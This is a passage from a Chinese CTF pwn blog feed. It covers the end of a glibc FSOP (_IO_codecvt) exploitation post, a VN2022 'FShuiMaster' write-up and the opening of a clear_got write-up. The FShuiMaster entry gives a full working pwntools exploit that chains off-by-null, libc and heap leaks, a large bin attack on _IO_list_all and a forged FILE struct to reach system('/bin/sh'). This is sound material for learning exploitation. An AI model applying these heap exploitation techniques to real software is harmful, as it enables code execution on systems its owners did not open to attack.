(*cv-&gt;__codecvt_do_encoding) (cv);</span><br></pre></td></tr></table></figure><p>这里又是将fp-&gt;_codecvt-&gt;__codecvt_do_encoding来做为函数来执行，参数则是fp-&gt;_codecvt</p><p>再看_IO_codecvt结构体在源码是什么样子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*__codecvt_destr) (struct _IO_codecvt *);</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> (*__<span class="title">codecvt_do_out</span>) (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *,</span></span><br><span class="line"><span class="class">     __<span class="title">mbstate_t</span> *,</span></span><br><span class="line"><span class="class">     <span class="title">const</span> <span class="title">wchar_t</span> *,</span></span><br><span class="line"><span class="class">     <span class="title">const</span> <span class="title">wchar_t</span> *,</span></span><br><span class="line"><span class="class">     <span class="title">const</span> <span class="title">wchar_t</span> **, <span class="title">char</span> *,</span></span><br><span class="line"><span class="class">     <span class="title">char</span> *, <span class="title">char</span> **);</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> (*__<span class="title">codecvt_do_unshift</span>) (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *,</span></span><br><span class="line"><span class="class"> __<span class="title">mbstate_t</span> *, <span class="title">char</span> *,</span></span><br><span class="line"><span class="class"> <span class="title">char</span> *, <span class="title">char</span> **);</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> (*__<span class="title">codecvt_do_in</span>) (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *,</span></span><br><span class="line"><span class="class">    __<span class="title">mbstate_t</span> *,</span></span><br><span class="line"><span class="class">    <span class="title">const</span> <span class="title">char</span> *, <span class="title">const</span> <span class="title">char</span> *,</span></span><br><span class="line"><span class="class">    <span class="title">const</span> <span class="title">char</span> **, <span class="title">wchar_t</span> *,</span></span><br><span class="line"><span class="class">    <span class="title">wchar_t</span> *, <span class="title">wchar_t</span> **);</span></span><br><span class="line">  <span class="keyword">int</span> (*__codecvt_do_encoding) (struct _IO_codecvt *);</span><br><span class="line">  <span class="keyword">int</span> (*__codecvt_do_always_noconv) (struct _IO_codecvt *);</span><br><span class="line">  <span class="keyword">int</span> (*__codecvt_do_length) (struct _IO_codecvt *, <span class="keyword">__mbstate_t</span> *,</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">  <span class="keyword">int</span> (*__codecvt_do_max_length) (struct _IO_codecvt *);</span><br><span class="line"></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到这里的__codecvt_do_encoding偏移量为4，所以要进行利用只需要满足以下条件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.f</span>p-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line"><span class="number">2.f</span>p-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line"><span class="number">3.</span>*(fp-&gt;_codecvt+<span class="number">4</span>)=func,参数就是fp-&gt;_codecvt</span><br></pre></td></tr></table></figure><p>当然，我们这里依旧需要绕过_IO_flush_all_lokcp函数。</p><p>后面会在梳理house_of_pig也就是在Glibc2.31下的利用。</p><hr><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a class="link"   href="https://darkeyer.github.io/2020/08/17/FSOP%E5%9C%A8glibc2.29%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/" >https://darkeyer.github.io/2020/08/17/FSOP%E5%9C%A8glibc2.29%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://xz.aliyun.com/t/5579" >https://xz.aliyun.com/t/5579<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文章开头给出_IO_FILE结构体的偏移:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="FSOP" scheme="https://cv196082.gitee.io/tags/FSOP/"/>
    
  </entry>
  
  <entry>
    <title>VN2022复现_FShuiMaster</title>
    <link href="https://cv196082.gitee.io/2022/02/22/VN2022%E5%A4%8D%E7%8E%B0-FShuiMaster/"/>
    <id>https://cv196082.gitee.io/2022/02/22/VN2022%E5%A4%8D%E7%8E%B0-FShuiMaster/</id>
    <published>2022-02-22T09:34:05.000Z</published>
    <updated>2022-03-03T05:33:24.309Z</updated>
    
    <content type="html"><![CDATA[<p>这道题目只有三解，但是确实是有难度，这里我只写上思路在<strong>这周内</strong>补上以上知识点的文章。</p><p>首先题目的保护是全开的，在edit内存在明显的off by null，然后在increase函数里限制了chunk的大小必须为large chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">get_Input</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(a1 + i) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">    *(a1 + a2) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一步就是利用off by null来leak libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x448</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x4f0</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0x8a0</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">main_arena_96 = u64(r.recvuntil(</span><br><span class="line">    <span class="string">b&#x27;\n\nOne: increase a page of U book&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br></pre></td></tr></table></figure><p>因为我是复现所以我的思路是根据其他exp的，其实按照我的写法是没必要泄漏heap的地址的，但是我写了还是贴出来吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x448</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 5 1</span></span><br><span class="line">create(<span class="number">0x448</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x448</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 8</span></span><br><span class="line">create(<span class="number">0x450</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 9</span></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 10</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)  <span class="comment"># 11</span></span><br><span class="line">show(<span class="number">11</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_addr = u64(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr=&gt;&#x27;</span>, <span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>后面就是FSOP的内容了，在glibc2.24及以后，添加了vtable check的保护措施，所以不能直接修改vtable的值(会有专门解释FSOP的文章)。</p><p>又因为FILE结构体其实是用_IO_list_all来维护的(其中储存着_IO_2_1_stderr_的地址)，所以我们这里只需要修改其中的值到一个chunk，然后将vtable的值换为_IO_str_jumps-8，并且根据要求构造FILE结构体就好。</p><p>最后使用large bin attack(也会有专门解释各glibc版本下的利用方式)。将_IO_list_all改为堆地址然后将相应的堆内容换为构造的FILE结构体。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./FShuiMaster&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./FShuiMaster&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Five: Finished!\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Number of words?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input U character&#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Five: Finished!\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the page U want 2 change&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Now Change U this page : &#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Five: Finished!\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please Input the page U want 2 tear off&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Five: Finished!\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please Input The page U want 2 scan&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span>(<span class="params">_IO_read_base=<span class="number">0</span>, _IO_write_base=<span class="number">0</span>, _IO_write_ptr=<span class="number">0</span>, _IO_buf_base=<span class="number">0</span>, _mode=<span class="number">0</span>, vtable=<span class="number">0</span></span>):</span></span><br><span class="line">    IO_FILE = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(_IO_read_base) + \</span><br><span class="line">        p64(_IO_write_base)+p64(_IO_write_ptr)+p64(<span class="number">0</span>)+p64(_IO_buf_base)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    IO_FILE += p32(_mode)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(vtable)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Please Write U Name on the Book\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;196082&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x448</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x4f0</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0x8a0</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">main_arena_96 = u64(r.recvuntil(</span><br><span class="line">    <span class="string">b&#x27;\n\nOne: increase a page of U book&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x448</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 5 1</span></span><br><span class="line">create(<span class="number">0x448</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x448</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 8</span></span><br><span class="line">create(<span class="number">0x450</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 9</span></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 10</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)  <span class="comment"># 11</span></span><br><span class="line">show(<span class="number">11</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_addr = u64(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr=&gt;&#x27;</span>, <span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">IO_list_all = libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">IO_str_jumps = libc_base + <span class="number">0x3e8360</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;_IO_list_all=&gt;&#x27;</span>, <span class="built_in">hex</span>(IO_list_all))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;_IO_str_jumps=&gt;&#x27;</span>, <span class="built_in">hex</span>(IO_str_jumps))</span><br><span class="line">file_struct = pack_file(IO_list_all, <span class="number">0</span>, <span class="number">1</span>, bin_sh_addr, <span class="number">0</span>, IO_str_jumps-<span class="number">8</span>)</span><br><span class="line">file_struct += p64(<span class="number">0</span>)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 12</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 13</span></span><br><span class="line">create(<span class="number">0x458</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 14</span></span><br><span class="line">create(<span class="number">0x4f0</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 15</span></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 16</span></span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">edit(<span class="number">14</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0x8b0</span>))</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 17</span></span><br><span class="line">create(<span class="number">0x458</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 18 14</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x4f0</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 19</span></span><br><span class="line">create(<span class="number">0x470</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 20</span></span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line">edit(<span class="number">5</span>, p64(main_arena_96)+p64(IO_list_all-<span class="number">0x10</span>))</span><br><span class="line">create(<span class="number">0x500</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">edit(<span class="number">14</span>, file_struct[<span class="number">0x10</span>:])</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Five: Finished!\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>其他师傅只使用一次off by null，我一直卡在最后构造结构体的位置，换换脑子过后想到了用两次off by null来解决这个问题。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这道题目只有三解，但是确实是有难度，这里我只写上思路在&lt;strong&gt;这周内&lt;/strong&gt;补上以上知识点的文章。&lt;/p&gt;
&lt;p&gt;首先题目的保护是全开的，在edit内存在明显的off by null，然后在increase函数里限制了chunk的大小必须为large ch</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="FSOP" scheme="https://cv196082.gitee.io/tags/FSOP/"/>
    
    <category term="off bu null" scheme="https://cv196082.gitee.io/tags/off-bu-null/"/>
    
    <category term="large bin attack" scheme="https://cv196082.gitee.io/tags/large-bin-attack/"/>
    
  </entry>
  
  <entry>
    <title>VN2022复现[1]</title>
    <link href="https://cv196082.gitee.io/2022/02/14/VN2022%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2022/02/14/VN2022%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-02-14T15:00:25.000Z</published>
    <updated>2022-02-14T14:58:38.437Z</updated>
    
    <content type="html"><![CDATA[<p>首先反思一下，整场比赛我只看了HideOnHeap和classic_httpd这两道题(因为在最开始的时候这两道题是排在最前面的)。发现毫无思路我就直接开始摆烂了，后面的pwn题也是一道没看，甚至都没下载下来。 <strong>拒绝摆烂，从你我做起！</strong></p><h2 id="clear-got"><a href="#clear-got" class="headerlink" title="clear_got"></a>clear_got</h2><p>这个题目就是一个非常简单的栈溢出，咋一看以为是SROP实际上就是非常基础的ROP即可(愈发觉得自己摆烂不是人了)。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">92</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+5Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to VNCTF! This is a easy competition.///&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  v5 = (<span class="keyword">int</span>)&amp;qword_601008;</span><br><span class="line">  <span 